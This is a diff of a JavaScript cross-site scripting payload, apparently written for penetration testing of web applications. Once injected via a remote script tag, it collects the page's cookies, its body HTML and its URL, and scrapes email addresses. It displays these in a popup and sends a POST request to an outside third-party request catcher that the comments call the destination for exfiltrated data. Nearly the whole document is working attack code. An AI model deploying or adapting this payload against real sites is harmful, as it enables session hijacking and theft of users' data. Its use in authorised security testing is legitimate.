@@ -2,25 +2,27 @@
 //<script src="https://jdl-84.github.io/CACHE-XSS/XSS.js"></script> 
 
 //Update Title for confirmation script loaded
-//We're not trying to be surreptitious about the app testing
+//We're not trying to be surreptitious about the app testing!
 document.title = "XSS-Active"
 
 //APP SPECIFIC 
 //Put Back the variable used to invoke the XSS
 var websession  = '1';
 var mysessionno  = '1';
+//Reset the requried times 
 var CurrDT          = new Date();
 var TimeAsMS        = CurrDT.getTime();
 var LastRefresh = TimeAsMS;
 var timeoutlength = 9999000;
-//////////
+///////////////////////////////////////////////////
 
-//Get Secrets for display 
-var UsersCookie = document.cookie;
-var DocHTML = document.getElementsByTagName('html')[0].innerHTML;
-var DocLocation = document.location.href;
+//Variables 
+var UsersCookie;
+var DocHTML;
+var DocLocation;
+var EmailAddresses;
 
-
+//The internet POST destination for our exfiltrated data. 
 var Toilet = "https://ptsv2.com/t/qo33d-1598654477";
 
 function ExfiltrateData(ID)
@@ -28,72 +30,99 @@ function ExfiltrateData(ID)
 	 //The popup proves we can obtain the data. 
 	 //Now we need to prove we can move it else where.
 	 //We can't post anything that would indentify the application we've used this script against. 
-	 //ID is the current Timestamp in MS. 	 
-	 //Send Request to Toilet - Thirdparty POST catcher. 
+	 //ID is the current Timestamp in MS so is a good unique identifer.  	 
+	 //POST Request to Toilet 
 	 const xhr = new XMLHttpRequest();
 	 xhr.open("POST", Toilet+"/post", true);
 	 xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
 	 xhr.send("XSS-TEST-"+ID);	
 }
 
-function BuildTitle(doc,name)
+//Build a space in the popup for the each bit of data 
+function BuildContainer(doc,titletext,datatext,dataheight,hyperlink)
 {
-	var header = doc.document.createElement("h4");
-	header.style = "color:fff;";
-	header.innerHTML = name;
-	doc.document.body.appendChild(header);
+	if(datatext){	
+	//Container
+	var container = doc.document.createElement("div");
+	container.setAttribute("class","center");
+	
+	//Title
+	var Title = doc.document.createElement("div");
+	Title.setAttribute("class","title");
+	Title.innerHTML = titletext;
+	container.appendChild(Title);
+	
+	//Data
+	if(hyperlink ==1)
+	{
+		var HyperLink = doc.document.createElement("a");
+		HyperLink.setAttribute("class","BTN");
+		HyperLink.innerHTML = datatext;
+		HyperLink.href = Toilet;
+		HyperLink.target="_blank"
+		container.appendChild(HyperLink);
+	}
+	else
+	{
+		var Datafield = doc.document.createElement("textarea");
+		Datafield.setAttribute("class","DataArea");
+		Datafield.innerHTML = datatext;
+		Datafield.readOnly = "true";
+		Datafield.style = "height:"+dataheight+"px;";
+		container.appendChild(Datafield);
+	}
+	
+	doc.document.body.appendChild(container);
+	}//End If DataText
 }
 
-function BuildTextArea(doc,height,data)
-{
-	var TextAreaStyle = "width:100%;margin-left:0px;margin-right:0px;background:rgb(79, 79, 79);";
-	var txtArea = doc.document.createElement("TEXTAREA");
-	txtArea.innerHTML = data;
-	txtArea.style = "height:"+height+"px;"+TextAreaStyle;
-	doc.document.body.appendChild(txtArea);
+//Search for regex based data
+function SearchByRegex(BODYTEXT,REGEX){
+	var SB="";
+	var regExParsed = new RegExp(REGEX, 'gi');
+	var m;
+	do {
+		m = regExParsed.exec(BODYTEXT);
+    if (m) 
+	{
+        SB += m[1]+"\r\n";
+    }
+	} while (m);	
+	return SB;
 }
 
-function BuildButton(href,doc,val)
-{
-	var aExData = doc.document.createElement("a");
-	aExData.style = "color:000;margin-Top:15px;margin-left:0px;margin-right:0px;box-shadow:inset 0px 1px 0px 0px #ffffff;	background:linear-gradient(to bottom, #ffffff 5%, #f6f6f6 100%);	background-color:#ffffff;	border-radius:6px;	border:1px solid #dcdcdc;	display:block;	cursor:pointer;	color:#666666;	font-family:Arial;	font-size:15px;	font-weight:bold;	padding:6px 24px;	text-decoration:none;	text-shadow:0px 1px 0px #ffffff;";
-	aExData.innerHTML = val;
-	aExData.href = href;
-	aExData.target="_blank";
-	doc.document.body.appendChild(aExData);
-}
-
+//Create the popup to show possible data to exfiltrate. 
 function createPopup(){
+var pH =500;
+var pW = 600;
+var popup = open("", "", "width="+pW+"px,height="+pH+"px,toolbar=0,menubar=0,location=0,scrollbars=0,resizable=0");
+//Header
+var style= popup.document.createElement("style");
+style.innerHTML  = ".grid-container,body,html{height:100%;margin:0}body{background:#353535}.center{margin:auto;padding:5px}.title{color:#fff;font-family:Arial,Helvetica,sans-serif;font-weight:700;font-size:12px;font-variant:small-caps}.DataArea{width:100%;height:100px;margin-top:5px;background:#1c1c1c;border:1px solid #3c3c3c;color:#900;font-family:'Courier New',Courier,monospace}.BTN{background:#1c1c1c;border:1px solid #3c3c3c;padding:3px;margin-top:5px;display:block;text-decoration:none;color:#900;font-family:'Courier New',Courier,monospace}";
+popup.document.head.appendChild(style);
+popup.document.title = "XSS Data Exfiltration";
+//END Header
 
-var popup = open("", "", "width=800,height=600,toolbar=0,menubar=0,location=0,scrollbars=0,resizable=0");
-popup.document.body.style.background = "rgb(53, 53, 53)";
-popup.document.title = "XSS Data";
-//URL Header
-BuildTitle(popup,"Document Location");
-//URL Doc
-BuildTextArea(popup,20, DocLocation);
+BuildContainer(popup,"Exfiltration ID",TimeAsMS,20,1);
+BuildContainer(popup,"Document Location",DocLocation,20,0);
+BuildContainer(popup,"Document Cookie",UsersCookie,100,0);
+BuildContainer(popup,"Document Body InnerHTML",DocHTML,100,0);
+BuildContainer(popup,"Gleaned - Email Addresses",SearchByRegex(DocHTML,"([a-zA-Z0-9._-]+@[a-zA-Z0-9._-]+\.[a-zA-Z0-9_-]+)"),100,0);
 
-//Cookie Doc Header
-BuildTitle(popup,"Document Cookie");
-
-//Cookie Doc
-BuildTextArea(popup,100, UsersCookie);
-
-//Doc Header
-BuildTitle(popup,"Document Inner HTML");
-//Cookie Doc
-BuildTextArea(popup,100, DocHTML);
-
-//URL Header
-BuildTitle(popup,"Exfiltration ID");
-//URL Doc
-BuildTextArea(popup,20, TimeAsMS);
-
-//ExfiltrateData
-
-BuildButton(Toilet,popup,"Check Data Was Exfiltrated");
-
+//Close after sometime as they are annnoying me
+setTimeout(function() { popup.close();}, 10000);
 }
 
-ExfiltrateData(TimeAsMS);
-createPopup();
+//Wait for page to load. If XSS is first then there isn't anything to read
+window.addEventListener('load', function () {	
+
+	//Get Secrets for display 
+	UsersCookie = document.cookie;
+	DocHTML = document.getElementsByTagName('body')[0].innerHTML;
+	DocLocation = document.location.href;	
+
+	ExfiltrateData(TimeAsMS);
+	createPopup();
+
+})
+
